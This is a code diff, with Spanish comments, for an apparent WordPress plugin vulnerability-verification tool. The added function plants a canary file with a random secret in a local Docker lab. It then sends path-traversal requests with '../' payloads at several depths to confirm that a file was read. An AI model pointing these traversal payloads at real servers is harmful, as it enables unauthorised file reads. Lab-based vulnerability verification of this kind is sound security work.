@@ -52,6 +52,7 @@ _ALPINE_IMAGE = "alpine:3.20"
 _ID_HINTS = ("user_id", "uid", "id", "target", "target_id", "user")
 _EMAIL_HINTS = ("email", "mail", "user_email")
 _PASS_HINTS = ("pass", "password", "pwd", "user_pass")
+_PATH_HINTS = ("file", "path", "page", "template", "include", "doc", "filename", "tpl", "view")
 
 
 @dataclass
@@ -217,6 +218,16 @@ class _Lab:
             return ((r.stdout or "") + (r.stderr or "")).strip()
         except Exception as e:
             return f"(no se pudieron leer logs de {name}: {e})"
+
+    def write_canary(self, path: str, content: str, timeout: float = 15.0) -> bool:
+        """Escribe un fichero DENTRO del propio contenedor de Apache (no en el volumen compartido
+        /var/www/html -- esto usa `docker exec` directo), en una ruta del sistema de ficheros real
+        del contenedor. Sirve como marcador para verificar path-traversal/LFI de verdad: si el
+        endpoint vulnerable, al pedir una ruta ajena al directorio web, devuelve este contenido
+        exacto, es prueba inequivoca de lectura de fichero real -- no una deduccion por status code."""
+        r = self.sh("exec", "-i", self.wp, "sh", "-c", f"cat > {path}",
+                    input_text=content, timeout=timeout)
+        return r.returncode == 0
 
     def wp_cli(self, *args, timeout=120.0) -> subprocess.CompletedProcess:
         return self.sh("run", "--rm", "--network", self.net, "--platform", "linux/amd64",
@@ -776,6 +787,125 @@ def verify_wordpress_direct_login_as(
                           f"sigue denegado despues -- el login-as no se confirmo. Si el endpoint "
                           f"real exige un _wpnonce, incluyelo en 'parameters' (ver limitacion en "
                           f"el docstring de esta funcion)")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
+
+
+def verify_wordpress_path_traversal(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, path_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Verifica path-traversal/LFI: planta un fichero CANARIO con un secreto aleatorio en una ruta
+    del sistema de ficheros REAL del contenedor Apache (fuera del volumen /var/www/html, via
+    `docker exec` directo -- ver _Lab.write_canary), y confirma que, al pedir esa ruta a traves del
+    parametro de fichero/ruta que la hipotesis cita, la respuesta del endpoint devuelve el secreto
+    EXACTO. Esto es prueba inequivoca (un secreto de 32 caracteres aleatorios no puede aparecer por
+    casualidad), no una deduccion por status code o por el tamano de la respuesta.
+
+    Se prueban varias profundidades de '../' por delante de la ruta absoluta del canario (sin
+    saber de antemano cuantos niveles hay entre el directorio base del plugin y la raiz web), ya
+    que no se puede leer el codigo para saberlo con certeza en todos los casos; cada intento es una
+    peticion real, independiente, registrada en la evidencia. Siempre desmonta el laboratorio."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
+    if not path_param:
+        res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
+        res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
+                               "lleva la ruta/nombre de fichero; afina 'parameters' en la "
+                               "hipotesis del LLM o pasalo a mano (path_param_hint)")
+        return res
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        secret = secrets.token_hex(16)
+        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
+        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
+             f"propio contenedor, fuera del volumen web)...")
+        if not boot.lab.write_canary(canary_path, secret):
+            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
+            return res
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "path_param": path_param, "canary_path": canary_path, "canary_secret": secret,
+            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
+        })
+
+        m = (http_method or "GET").upper()
+        # varias profundidades de '../': el payload real depende de donde concatena el codigo el
+        # parametro, que no podemos saber con certeza sin leer el codigo -- cada intento es una
+        # peticion real, no una suposicion que se cuela como si fuera un hecho confirmado.
+        attempts = [canary_path.lstrip("/")] + [
+            ("../" * n) + canary_path.lstrip("/") for n in (2, 4, 6, 8, 10, 12)
+        ] + [canary_path]
+        found = False
+        tried = []
+        for payload_value in attempts:
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[path_param] = payload_value
+            step(f"probando {m} {endpoint} con {path_param}={payload_value!r}...")
+            try:
+                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                   data=payload if m != "GET" else None,
+                                   params=payload if m == "GET" else None, timeout=20)
+            except Exception as e:
+                tried.append({"payload": payload_value, "error": str(e)})
+                continue
+            tried.append({"payload": payload_value, "status": resp.status_code,
+                          "secret_presente": secret in (resp.text or "")})
+            if secret in (resp.text or ""):
+                found = True
+                res.evidence["payload_ganador"] = payload_value
+                res.evidence["status_code_respuesta"] = resp.status_code
+                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
+                     f"{path_param}={payload_value!r}.")
+                step("capturando pantalla: la respuesta HTTP con el secreto filtrado (prueba "
+                     "final)...")
+                shot_url = (boot.base_url + endpoint
+                           + ("&" if "?" in endpoint else "?")
+                           + f"{path_param}={payload_value}") if m == "GET" else None
+                if shot_url:
+                    boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
+                           f"Paso 5: LECTURA DE FICHERO confirmada -- la respuesta real del "
+                           f"servidor contiene el secreto plantado en {canary_path}, fuera del "
+                           f"directorio web previsto.",
+                           f"Step 5: FILE READ confirmed -- the server's real response contains "
+                           f"the secret planted at {canary_path}, outside the intended web "
+                           f"directory.")
+                break
+        res.evidence["intentos"] = tried
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
+                          f"{res.evidence['payload_ganador']!r} devolvio el secreto exacto "
+                          f"plantado en {canary_path} (fuera del directorio web)")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} variantes de ruta para {path_param} y "
+                          f"ninguna devolvio el secreto plantado -- el traversal no se confirmo "
+                          f"(puede necesitar otra profundidad de '../', otra codificacion, o el "
+                          f"endpoint/parametro no son los reales)")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
